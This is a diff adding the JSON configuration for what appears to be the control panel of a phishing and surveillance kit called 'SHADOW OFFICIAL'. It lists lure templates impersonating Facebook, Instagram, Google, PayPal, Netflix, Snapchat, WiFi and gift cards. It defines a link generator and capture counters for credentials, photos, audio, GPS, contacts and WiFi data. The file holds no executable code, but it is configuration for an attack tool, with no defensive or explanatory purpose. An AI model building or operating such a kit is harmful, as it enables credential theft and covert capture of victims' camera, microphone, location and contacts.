@@ -1,0 +1,47 @@
+{
+  "app_name": "SHADOW OFFICIAL",
+  "app_tagline": "SECURE INTELLIGENCE PLATFORM",
+  "app_emoji": "👑",
+  "brand_color": "#667eea",
+  "brand_color_secondary": "#764ba2",
+  "accent_color": "#00ffc8",
+  "danger_color": "#ff3264",
+  "success_color": "#00ff88",
+  "warning_color": "#ffc800",
+  "sidebar_title": "Command Center",
+  "login_title": "Secure Access",
+  "dashboard_title": "Command Center",
+  "footer_text": "ENCRYPTED CONNECTION",
+  "particles_count": 30,
+  "auto_refresh_interval": 10000,
+  "max_photos_per_capture": 5,
+  "templates": [
+    {"id": "gaming", "name": "Gaming", "icon": "🎮"},
+    {"id": "facebook", "name": "Facebook", "icon": "💬"},
+    {"id": "instagram", "name": "Instagram", "icon": "📷"},
+    {"id": "google", "name": "Google", "icon": "🔍"},
+    {"id": "pubg", "name": "PUBG", "icon": "🔫"},
+    {"id": "netflix", "name": "Netflix", "icon": "🎬"},
+    {"id": "tiktok", "name": "TikTok", "icon": "🎵"},
+    {"id": "paypal", "name": "PayPal", "icon": "💳"},
+    {"id": "snapchat", "name": "Snapchat", "icon": "👻"},
+    {"id": "wifi", "name": "WiFi", "icon": "📶"},
+    {"id": "gpay", "name": "Gift Card", "icon": "🎁"}
+  ],
+  "stats_labels": {
+    "photos": "Photos",
+    "creds": "Creds",
+    "audio": "Audio",
+    "total": "Total",
+    "gps": "GPS",
+    "contacts": "Contacts",
+    "wifi": "WiFi",
+    "users": "Users"
+  },
+  "nav_items": [
+    {"id": "dashboard", "label": "Dashboard", "icon": "fa-chart-line"},
+    {"id": "generate", "label": "Generate", "icon": "fa-link"},
+    {"id": "captures", "label": "Captures", "icon": "fa-camera"},
+    {"id": "settings", "label": "Settings", "icon": "fa-cog"}
+  ]
+}
